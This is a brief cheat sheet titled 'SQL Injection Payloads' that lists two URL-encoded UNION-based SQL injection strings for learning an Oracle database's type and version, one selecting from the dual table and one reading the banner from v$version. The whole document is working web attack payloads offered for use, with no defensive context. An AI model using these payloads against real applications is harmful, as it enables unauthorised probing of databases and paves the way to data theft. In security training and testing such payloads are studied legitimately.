# SQL Injection Payloads

- **Oracle database type and version information**
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
